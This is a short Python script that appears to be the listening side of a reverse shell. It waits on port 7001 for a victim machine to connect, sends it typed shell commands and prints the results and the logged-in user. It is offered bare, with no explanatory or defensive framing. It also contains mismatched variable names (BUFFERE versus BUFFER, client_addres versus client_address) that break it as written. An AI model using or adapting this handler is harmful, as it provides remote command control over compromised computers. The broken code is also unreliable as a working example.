import socket

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 7001
BUFFERE = 1024 * 128
SEPARATOR = "<sep>"
# create a socket object
s = socket.socket()

# bind the socket to all IP addresses of this host
s.bind((SERVER_HOST, SERVER_PORT))

# listen
s.listen(5)
print(f"Listening on {SERVER_HOST}:{SERVER_PORT} ")

# accept the connection
client_socket, client_addres = s.accept()
print(f"{client_address[0]}:{client_address[1]} You are successfully connected! ")

# checking logged in user
check_user = client_socket.recv(BUFFER).decode()
print("You are logged in as:", check_user)

while True:
    # get command line output
    command = input(f"{check_user} $> ")
    if not command.strip():
        continue
    # send command to client
    client_socket.send(command.encode())
    if command.lower() == "exit":
        break
    # get command result
    output = client_socket.recv(BUFFER).decode()
    results, check_user = output.split(SEPARATOR)
    print(results)

